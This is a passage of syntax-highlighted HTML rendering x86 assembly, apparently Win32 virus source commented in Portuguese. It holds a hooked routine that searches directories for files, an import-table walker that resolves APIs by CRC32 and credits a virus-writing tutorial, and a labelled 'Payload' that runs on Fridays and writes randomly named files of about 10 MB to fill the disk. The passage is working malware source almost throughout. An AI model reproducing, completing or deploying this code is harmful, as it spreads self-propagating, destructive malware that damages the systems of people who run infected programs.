</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">; AL = 0</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@scan_str</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">scasb</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@scan_str</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                        </span><span class="sc1">; EDI--</span><span class="sc0">

</span><span class="sc1">; Acha ultima barra do diretório...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">"\"                     ; AL = 5Ch
</span><span class="sc6">std</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@scan_str2</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">; EDI = EBX ?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">hook_fim</span><span class="sc0">                    </span><span class="sc1">; Então vaza pq não tem barra...</span><span class="sc0">
</span><span class="sc6">scasb</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@scan_str2</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                        </span><span class="sc1">; EDI++</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">; EDI = EDI - EBX</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">busca</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; Salva ECX !</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">; EDI = ECX</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">414h</span><span class="sc0">                   </span><span class="sc1">; EDI+= 414h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                       </span><span class="sc1">; EDI na stack...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">; ESI = EBX</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                      </span><span class="sc1">; Copia...</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                       </span><span class="sc1">; EDI na stack...</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">104h</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">

</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">       </span><span class="sc1">; Seta diretório...</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BuscaCDIR</span><span class="sc0">                 </span><span class="sc1">; Busca arquivos no diretório...</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">       </span><span class="sc1">; Seta diretório...</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LiberaW32FD</span><span class="sc0">               </span><span class="sc1">; Libera memoria usada...</span><span class="sc0">

</span><span class="sc5">hook_fim</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">popfd</span><span class="sc0">                          </span><span class="sc1">; Recupera flags...</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">                          </span><span class="sc1">; Recupera flags...</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                            </span><span class="sc1">; Executa API...</span><span class="sc0">


</span><span class="sc1">; *** PegaIAT -&gt; Adaptado do tutorial de Billy Belcebu ***</span><span class="sc0">
</span><span class="sc1">; *** PegaIAT -&gt; Adapted from Billy Belcebu tutorials  ***</span><span class="sc0">

</span><span class="sc5">PegaIAT</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FH</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Save API CRC32 for later</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">baseaddr</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ESI = imagebase</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc0">                               </span><span class="sc1">; Get ptr to PE header</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">                                     </span><span class="sc1">; AX = That pointer</span><span class="sc0">
</span><span class="sc6">cwde</span><span class="sc0">                                      </span><span class="sc1">; Clear MSW of EAX</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">baseaddr</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Normalize pointer</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">; ESI = Such pointer</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">                                     </span><span class="sc1">; Get DWORD</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"EP"</span><span class="sc0">                              </span><span class="sc1">; Is there the PE mark?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">nopes</span><span class="sc0">                                 </span><span class="sc1">; Fail... duh!</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">7Ch</span><span class="sc0">                               </span><span class="sc1">; ESI = PE header+80h</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">                                     </span><span class="sc1">; Look for .idata</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">                                     </span><span class="sc1">; Get size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">; ESI = 0 ?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">nopes</span><span class="sc0">                                  </span><span class="sc1">; Então vaza pq nao tem IAT...</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">baseaddr</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Normalize</span><span class="sc0">

</span><span class="sc5">SearchK32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                  </span><span class="sc1">; Save ESI in stack</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">; ESI = Ptr to name</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">baseaddr</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Normalize</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">04895FCC3h</span><span class="sc0">                        </span><span class="sc1">; CRC of 'KERNEL32'</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">                                  </span><span class="sc1">; Size of string</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">                                </span><span class="sc1">; Calculate CRC32</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                   </span><span class="sc1">; Restore ESI</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">gotcha</span><span class="sc0">                                 </span><span class="sc1">; Was it equal? Damn...</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">                               </span><span class="sc1">; Get another field</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SearchK32</span><span class="sc0">                             </span><span class="sc1">; And search again</span><span class="sc0">

</span><span class="sc5">gotcha</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">                   </span><span class="sc1">; Is OriginalFirstThunk 0?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">nopes</span><span class="sc0">                                 </span><span class="sc1">; Damn if so...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; Get FirstThunk</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">baseaddr</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Normalize</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">                                    </span><span class="sc1">; Get it</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">; Is it 0?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">nopes</span><span class="sc0">                                 </span><span class="sc1">; Damn...</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Get pointer to it</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">baseaddr</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">loopy</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">              </span><span class="sc1">; Last RVA?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">nopes</span><span class="sc0">                            </span><span class="sc1">; Damn...</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">         </span><span class="sc1">; Ordinal?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">reloop</span><span class="sc0">                           </span><span class="sc1">; Damn...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; Get pointer of an imported API</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">baseaddr</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; ESI = EDI</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">                              </span><span class="sc1">; Save all regs</span><span class="sc0">
</span><span class="sc5">eosd</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">scasb</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">eosd</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; EDI = API size</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Result in ECX after POPAD</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FH</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">; Is the CRC32 of this API</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">wegotit</span><span class="sc0">                          </span><span class="sc1">; equal as the one we want?</span><span class="sc0">

</span><span class="sc5">reloop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; If not, loop and search for</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">; another API in the IT</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loopy</span><span class="sc0">

</span><span class="sc5">wegotit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                           </span><span class="sc1">; Multiply per 4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Add FirstThunk</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; EAX = API address</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">                                 </span><span class="sc1">; Clear Carry</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B1h</span><span class="sc0">                             </span><span class="sc1">; Overlap: avoid STC :)</span><span class="sc0">

</span><span class="sc5">nopes</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">stc</span><span class="sc0">                                 </span><span class="sc1">; Set Carry</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">PegaIAT</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;            Payload</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Payload</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">SZ_SYSTEMTIME</span><span class="sc0">      </span><span class="sc1">; Reserva stack...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">                </span><span class="sc1">; EAX = Ponteiro reservado da stack</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Salva EAX!</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Endereço para armazenar SYSTEMTIME</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">GetSystemTime</span><span class="sc0">          </span><span class="sc1">; Pega system time...</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; Recupera EAX!</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">SZ_SYSTEMTIME</span><span class="sc0">      </span><span class="sc1">; Libera stack...</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">eax.wDayOfWeek</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EDI = DayOfWeek</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                  </span><span class="sc1">; EDI = EDI - 5</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">payload_fim</span><span class="sc0">            </span><span class="sc1">; Nhe.. num é hj :(</span><span class="sc0">

</span><span class="sc5">sexta_feira</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CREATE_NEW</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">nome_bomba</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MSBSD.XP .386"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; :P</span><span class="sc0">
</span><span class="sc5">nome_bomba</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">; Poxa tio Bill, cria vergonha nessa cara... rs.</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_ch</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_ch</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_ch</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">sexta_feira</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; EDI = EAX</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; EAX = 0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">  </span><span class="sc1">; Protect</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT_RESERVE</span><span class="sc0"> </span><span class="sc1">; AllocationType</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0AFFFFFh</span><span class="sc0">        </span><span class="sc1">; Size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Address</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">VirtualAlloc</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; EAX = 0 ?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">payload_fim</span><span class="sc0">       </span><span class="sc1">; Então vaza...</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc5">marca</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">            </span><span class="sc1">; [Handle]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; EAX = 0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_RELEASE</span><span class="sc0">    </span><span class="sc1">; FreeType</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">            </span><span class="sc1">; Address</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">100000h</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0A00000h</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; EAX = 0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">payload_bwr</span><span class="sc0">    </span><span class="sc1">; byteWritten</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">payload_bwr</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">; 10mb</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">            </span><span class="sc1">; Ponteiro para memoria...</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">            </span><span class="sc1">; FileHandle</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">       </span><span class="sc1">; escreve...</span><span class="sc0">

</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">VirtualFree</span><span class="sc0">     </span><span class="sc1">; Libera memória...</span><span class="sc0">

